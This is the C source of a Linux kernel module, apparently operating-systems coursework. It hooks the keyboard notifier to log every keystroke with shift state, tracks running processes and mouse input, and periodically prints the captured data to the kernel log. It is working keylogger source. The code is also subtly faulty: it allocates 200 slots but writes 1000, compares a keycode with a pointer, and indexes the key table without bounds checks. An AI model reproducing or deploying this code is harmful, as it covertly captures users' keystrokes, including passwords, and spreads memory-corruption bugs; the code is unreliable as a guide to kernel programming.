#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/init_task.h>
#include <linux/timer.h>
#include <linux/keyboard.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "data_structures.h"

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Krivozubov Vlad");

#define PROCESS_CHECK_PERIOD 1000
#define INPUT_DATA_PERIOD 2000
#define REPORT_PERIOD 5000

static const char* keys[] = { 
    "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", 
    "9", "0", "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", 
    "t", "y", "u", "i", "o", "p", "SPACE", "SPACE", "ENTER", "lCTRL", 
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", 
    "'", "`", "lSHIFT", "\\", "z", "x", "c", "v", "b", "n", 
    "m", ",", ".", "/", "rSHIFT", "\0", "lALT", "SPACE", "CAPSLOCK", "F1", 
    "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", // 60 - 69 
    "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5", "RTARROW", "+", "END", 
    "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12", "\0", // 80 - 89 
    "\0", "\0", "\0", "\0", "\0", "\0", "rENTER", "rCTRL", "/", "PRTSCR", 
    "rALT", "\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", // 100 - 109 
    "INSERT", "DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE", 
    "\0", "\0", "\0", "\0", "\0", "WIN", "\0", "\0", "\0", "\0"
};

static const int keys_max = 129;

// хранилище процессов
static process *process_data;
static int process_data_size = 0;

// хранилище событий мыши
static mouse_data_package *mouse_data;
static int mouse_data_size = 0;

// хранилище событий клавиатуры
static keyboard_data_package *keyboard_data;
static int keyboard_data_size = 0;

// таймеры
static struct timer_list process_data_timer;
static struct timer_list input_data_timer;
static struct timer_list report_timer;

// сокет для передачи отчета
struct socket *report_socket = NULL;

// обработка данных от клавиатуры
void apply_keyboard_data(keyboard_event_data info) {
    int size = keyboard_data[keyboard_data_size].size;

    if (size < 1000) {  
        keyboard_data[keyboard_data_size].info[size] = info;
        keyboard_data[keyboard_data_size].size += 1;
    }
}

static int isShiftKey = 0;
int keylogger_handler(struct notifier_block *nblock, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;

    // 9 - красный фон
    // 10 - зеленый
    /*
    printk("\033[48;5;10m \033[m"); // printk всегда делает /n
    printk("\033[48;5;10m \033[m");
    printk("\033[48;5;9m \033[m");
    printk("\033[48;5;9m \033[m");
    printk("\033[48;5;10m \033[m");
    printk("\033[48;5;10m \033[m");
    printk("\033[48;5;10m \033[m");
    */
    if (code == KBD_KEYCODE) {
        if (param->value == 42 || param->value == 54) {
            if (param->down)
                isShiftKey = 1;
            else
                isShiftKey = 0;
            return NOTIFY_OK;
        }

        if (param->down) {
            keyboard_event_data info;
            if (param->value > keys) {
                sprintf(info.description, "id-%d\n", param->value);
                //printk("keyboard: id-%d\n", param->value);
            }
            if (isShiftKey == 0) {
                sprintf(info.description, "%s\n", keys[param->value]);
                //printk("keyboard: %s\n", keys[param->value]);
            } else {
                sprintf(info.description, "shift + %s\n", keys[param->value]);
                //printk("keyboard: shift + %s\n", keys[param->value]);
            }
            apply_keyboard_data(info);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger = {
	.notifier_call = keylogger_handler
};

// обработка данных от мыши
void send_mouse_data(mouse_event_data info) {
    int size = mouse_data[mouse_data_size].size;

    if (size < 1000) {  
        mouse_data[mouse_data_size].info[size] = info;
        mouse_data[mouse_data_size].size += 1;
    }
}

void handle_process(char *name) {
    int flag = 1;
    int i;
    for (i = 0; i < process_data_size; i++) {
        if (!strcmp(process_data[i].name, name)) {
            //printk("equal process names: %s", name);
            process_data[i].secs_in_use += 1;
            flag = 0;
            break;
        }
    }
    if (flag == 1) {
        if (process_data_size < 1000) {
            process_data[process_data_size].name = (char *)kmalloc(sizeof(char) * (strlen(name) + 1), GFP_KERNEL);
            snprintf(process_data[process_data_size].name, strlen(name) + 1, "%s", name);
            process_data[process_data_size].secs_in_use += 1;
            process_data_size += 1;
        }
    }
}

void handle_process_data_timer_call(struct timer_list *timer)
{
    printk("PROCESS DATA TIMER TRIGGERED!\n");

	struct task_struct *task = &init_task;
 	do
	{
        handle_process(task->comm);
 	} while ((task = next_task(task)) != &init_task);
 	
    mod_timer(timer, jiffies + msecs_to_jiffies(2000));	
}

void handle_input_data_timer_call(struct timer_list *timer)
{
	printk("INPUT DATA TIMER TRIGGERED!\n");

    mouse_data_size += 1;
    keyboard_data_size += 1;


	mod_timer(timer, jiffies + msecs_to_jiffies(INPUT_DATA_PERIOD));
}

void reset_after_report(void) {
    int i;
    for (i = 0; i < mouse_data_size; i++) {
        mouse_data[i].size = 0;
    }
    for (i = 0; i < keyboard_data_size; i++) {
        keyboard_data[i].size = 0;
    }
    keyboard_data_size = 0;

    for (i = 0; i < process_data_size; i++) {
        kfree(process_data[i].name);
        process_data[i].secs_in_use = 0;
    }
    process_data_size = 0;
}

void handle_report_timer_call(struct timer_list *timer)
{
	printk("REPORT TIMER TRIGGERED!\n");
	// тут будет большой бизнес логика с обработкой процессов и компановкой часового отчета

    int i, j;
    printk("MOUSE DATA");
    for (i = 0; i < mouse_data_size; i++) {
        printk("MOUSE PACKAGE #%d", i);
        for (j = 0; j < mouse_data[i].size; j++) {
            printk("MOUSE EVENT #%d", j);
            printk(
                "%s %s %s %s",
                mouse_data[i].info[j].buttons,
                mouse_data[i].info[j].dx, 
                mouse_data[i].info[j].dy, 
                mouse_data[i].info[j].wheel
            );
        }
    }

    printk("KEYBOARD DATA");
    for (i = 0; i < keyboard_data_size; i++) {
        printk("KEYBOARD PACKAGE #%d", i);
        for (j = 0; j < keyboard_data[i].size; j++) {
            printk("KEYBOARD EVENT #%d", j);
            printk(
                "%s",
                keyboard_data[i].info[j].description
            );
        }
    }

    printk("PROCESS DATA");
    for (i = 0; i < process_data_size; i++) {
        printk("PROCESS #%d", i);
        printk(
            "name - %s, secs - %d",
            process_data[i].name,
            process_data[i].secs_in_use
        );
    }

    reset_after_report();
	mod_timer(timer, jiffies + msecs_to_jiffies(REPORT_PERIOD));
}

void setup_timers(void)
{
	// setup process data timer
    timer_setup(&process_data_timer, handle_process_data_timer_call, 0);
    mod_timer(&process_data_timer, jiffies + msecs_to_jiffies(PROCESS_CHECK_PERIOD));

	// setup input data timer
	timer_setup(&input_data_timer, handle_input_data_timer_call, 0);
	mod_timer(&input_data_timer, jiffies + msecs_to_jiffies(INPUT_DATA_PERIOD));

	// setup report timer
	timer_setup(&report_timer, handle_report_timer_call, 0);
	mod_timer(&report_timer, jiffies + msecs_to_jiffies(REPORT_PERIOD));
}

static int __init md_init(void) 
{
    int i;
    mouse_data = (mouse_data_package *)kmalloc(sizeof(mouse_data_package) * 200, GFP_KERNEL);
    if (!mouse_data) {
        printk("MEMORY ALLOCATION FAILED [MOUSE DATA STORAGE]");
    }

    for (i = 0; i < 1000; i++) {
        mouse_event_data *mouse_data_package = (mouse_event_data *)kmalloc(sizeof(mouse_event_data) * 1000, GFP_KERNEL);
        if (!mouse_data_package) {
            printk("MEMORY ALLOCATION FAILED [MOUSE DATA PACKAGE - size for now %d]", mouse_data_size);
        } else {
            mouse_data[i].info = mouse_data_package;
            mouse_data[i].size = 0;
        }
    }

    keyboard_data = (keyboard_data_package *)kmalloc(sizeof(keyboard_data_package) * 200, GFP_KERNEL);
    if (!keyboard_data) {
        printk("MEMORY ALLOCATION FAILED [KEYBOARD DATA STORAGE]");
    }
    for (i = 0; i < 1000; i++) {
        keyboard_event_data *keyboard_data_package = (keyboard_event_data *)kmalloc(sizeof(keyboard_event_data) * 1000, GFP_KERNEL);
        if (!keyboard_data_package) {
            printk("MEMORY ALLOCATION FAILED [KEYBOARD DATA PACKAGE - size for now %d]", keyboard_data_size);
        } else {
            keyboard_data[i].info = keyboard_data_package;
            keyboard_data[i].size = 0;
        }
    }

    process_data = (process *)kmalloc(sizeof(process) * 1000, GFP_KERNEL);
    if (!process_data) {
        printk("MEMORY ALLOCATION FAILED [PROCESS STORAGE]");
    }

	setup_timers();
	
	register_keyboard_notifier(&keylogger);

	printk("OS_COURSEWORK module is loaded.\n");
 	return 0;
}

static void __exit md_exit(void) 
{
    del_timer(&process_data_timer);
	del_timer(&input_data_timer);
	del_timer(&report_timer);

	unregister_keyboard_notifier(&keylogger);

    // free memory
    int i;
    for (i = 0; i < 1000; i++) {
        kfree(mouse_data[i].info);
    }
    kfree(mouse_data);

    for (i = 0; i < 1000; i++) {
        kfree(keyboard_data[i].info);
    }
    kfree(keyboard_data);

    for (i = 0; i < process_data_size; i++) {
        kfree(process_data[i].name);
    }
    kfree(process_data);

	printk("OS_COURSEWORK module is unloaded.\n");
}

EXPORT_SYMBOL(send_mouse_data);
module_init(md_init);
module_exit(md_exit);